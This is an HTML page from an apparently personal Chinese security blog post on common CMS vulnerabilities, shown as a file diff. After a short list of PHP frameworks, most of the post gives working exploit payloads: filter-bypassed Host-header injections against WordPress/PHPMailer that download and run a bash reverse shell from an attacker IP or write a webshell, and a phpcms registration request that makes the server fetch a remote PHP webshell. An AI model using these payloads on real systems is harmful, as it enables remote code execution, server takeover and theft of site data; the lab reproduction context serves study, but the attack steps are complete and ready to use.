@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>phpcms常见漏洞 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PHP框架什么是框架框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。 PHP常用框架1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。3.CakePHP是国外的框架.4.Symfony，是一套国外的">
+<meta name="keywords" content="web漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms常见漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/03/18/phpcms常见漏洞/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PHP框架什么是框架框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。 PHP常用框架1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。3.CakePHP是国外的框架.4.Symfony，是一套国外的">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/18/AnFmvR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/18/AnFMb6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/18/AnFUKI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/19/An2YM6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/19/An2ReS.png">
+<meta property="og:updated_time" content="2019-03-19T08:18:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcms常见漏洞">
+<meta name="twitter:description" content="PHP框架什么是框架框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。 PHP常用框架1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。3.CakePHP是国外的框架.4.Symfony，是一套国外的">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/03/18/AnFmvR.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-phpcms常见漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/18/phpcms常见漏洞/" class="article-date">
+  <time datetime="2019-03-17T16:00:00.000Z" itemprop="datePublished">2019-03-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpcms常见漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h1><h2 id="什么是框架"><a href="#什么是框架" class="headerlink" title="什么是框架"></a>什么是框架</h2><p>框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。</p>
+<h2 id="PHP常用框架"><a href="#PHP常用框架" class="headerlink" title="PHP常用框架"></a>PHP常用框架</h2><p>1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。<br>2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。<br>3.CakePHP是国外的框架.<br>4.Symfony，是一套国外的PHP开源框架。<br>5.CodeIgniter（CI）轻量级框架，运行速度快<br>6.CanPHP框架是一个简洁，实用，高效，遵循apache协议的php开源框架。<br>7。Laravel 是一个简单优雅的 PHP web 开发框架，将你从意大利面条式的代码中解放出来。通过简单的、表达式语法开发出很棒的 Web 应用。<br>8.SlimFramework是一个简单的 PHP5 框架用来创建 RESTful 的 Web 应用。<br>9.ThinkPHP是一个快速、简单、面向对象的轻量级PHP开发框架。<br>10.PHPUnit是一个轻量级的PHP测试框架。<br>11、KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。<br>12、initPHP是一款轻量级的php开发框架。<br>13、SpeedPHP是一款全功能的国产PHP应用框架系统。</p>
+<p>参考：<a href="http://baijiahao.baidu.com/s?id=1604870874054619554&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">http://baijiahao.baidu.com/s?id=1604870874054619554&amp;wfr=spider&amp;for=pc</a></p>
+<h2 id="php常用cms"><a href="#php常用cms" class="headerlink" title="php常用cms"></a>php常用cms</h2><p>wordpress</p>
+<p>phpcms </p>
+<p>dedecms(织梦)</p>
+<p>Ecms(帝国cms)</p>
+<p>Discuz</p>
+<p>参考：<a href="https://www.cnblogs.com/yonge/articles/2662334.html" target="_blank" rel="noopener">https://www.cnblogs.com/yonge/articles/2662334.html</a></p>
+<h1 id="cms常见漏洞"><a href="#cms常见漏洞" class="headerlink" title="cms常见漏洞"></a>cms常见漏洞</h1><h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><p>wordpress 编写采用原生php，并不是基于框架开发。</p>
+<p>漏洞影响版本：WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18，此处记录下复现过程。</p>
+<p>首先搭建环境。</p>
+<pre><code>下载镜像：docker pull medicean/vulapps:w_wordpress_6
+
+启动环境： docker run -it -d -p 8888:80 medicean/vulapps:w_wordpress_6 
+
+然后交互式进入docker镜像 docker exec -it 775c7c9ee1e1 /bin/bash  </code></pre><p>这里搭建8888端口映射镜像的80 http服务，安装好之后打开存在漏洞的url</p>
+<pre><code>http://47.106.185.69:8888//wp-login.php?action=lostpassword</code></pre><p>这里输入admin，必须要服务器存在用户才可以成功完成攻击。</p>
+<h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><p>首先我们进行命令执行反弹shell。</p>
+<p>第一步在服务器端创建存在反弹shell命令的文件，第二步 bash运行反弹shell的文件。</p>
+<p>poc构建之前先给个tip</p>
+<pre><code>空格 ==&gt; {substr{10}{1}{tod_log}}
+
+/ ==&gt; {substr{0}{1}{spool_directory}}</code></pre><p>第一步poc：</p>
+<pre><code>原poc aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /tmp/rce xx.106.185.xx/a.txt}} null)
+
+绕过后：
+aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}xx.106.185.xx${substr{0}{1}{$spool_directory}}a.txt}} null)</code></pre><p>xx.106.185.xx改为自己的IP，poc为访问自己IP上的a.txt并保存在自己服务器上的/tmp/rce文件里。第二步我们运行rce文件即可。</p>
+<p>其中xx.xx.xx.xx/a.txt内容为：  bash -i &gt;/dev/tcp/自己IP/6666 0&lt;&amp;1 2&gt;&amp;1</p>
+<p>第二步poc：</p>
+<pre><code>原poc aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null)
+
+绕过后：
+aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)</code></pre><p>实战，打开url <a href="http://47.106.185.69:8888//wp-login.php?action=lostpassword" target="_blank" rel="noopener">http://47.106.185.69:8888//wp-login.php?action=lostpassword</a> 输入admin，提交抓包。</p>
+<p>修改host头，并且使用第一条poc。复制第一条poc到host头，</p>
+<p><img src="https://s2.ax1x.com/2019/03/18/AnFmvR.png" alt></p>
+<p>即可看到服务器创建了rce文件。<br><img src="https://s2.ax1x.com/2019/03/18/AnFMb6.png" alt><br>43 0<br>接下来使用第二个poc，一样的做法粘贴到host头，自己的服务器监听端口等待shell.</p>
+<p><img src="https://s2.ax1x.com/2019/03/18/AnFUKI.png" alt></p>
+<p>可以看到已经反弹回来shell。</p>
+<h3 id="创建shell"><a href="#创建shell" class="headerlink" title="创建shell"></a>创建shell</h3><p>创建shell，很简单就创建文件即可，</p>
+<pre><code>原poc :
+aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/shell.php xx.xx.xx.xx/zk/one.txt}} null)
+
+绕过poc：
+
+aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}shell.php${substr{10}{1}{$tod_log}}xx.xx.xx.xx${substr{0}{1}{$spool_directory}}zk${substr{0}{1}{$spool_directory}}one.txt}} null)</code></pre><p>即可成功创建，连接菜刀即可，</p>
+<p>xx.xx.xx.xx/zk/one.txt写一句话木马即可。</p>
+<p>然后连接shell.php菜刀即可。</p>
+<p>参考：<a href="https://www.cnblogs.com/ssooking/p/8893264.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/8893264.html</a></p>
+<h2 id="phpcms"><a href="#phpcms" class="headerlink" title="phpcms"></a>phpcms</h2><h3 id="phpcms任意文件上传getshell"><a href="#phpcms任意文件上传getshell" class="headerlink" title="phpcms任意文件上传getshell"></a>phpcms任意文件上传getshell</h3><p>为了方便复现，源码下载。</p>
+<pre><code>链接: https://pan.baidu.com/s/1geNQfyb 密码: gxsd</code></pre><p>安装成功后，打开注册页面。</p>
+<pre><code>http://127.0.0.1/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</code></pre><p>直接post如下poc，然后提交即可返回shell地址。</p>
+<pre><code>poc:siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</code></pre><p>注意：帐号或者邮件不能与别人重复。否则无法报错返回shell地址，但是已经创建。</p>
+<p><img src="https://s2.ax1x.com/2019/03/19/An2YM6.png" alt></p>
+<p>返回shell地址，直接连接即可。</p>
+<p><img src="https://s2.ax1x.com/2019/03/19/An2ReS.png" alt></p>
+<p>其中src=xx.xx.xx可以搭建在自己公网上shell文件，写马。让服务器下载。</p>
+<pre><code>自己备用。http://47.106.185.69/a.php</code></pre><p>参考：<a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/18/phpcms常见漏洞/" data-id="ck0l0oh9g000vpy2ig1dxdemg" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/23/一些脚本poc/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          poc脚本整理
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/13/钟馗之眼/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">钟馗之眼简单使用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
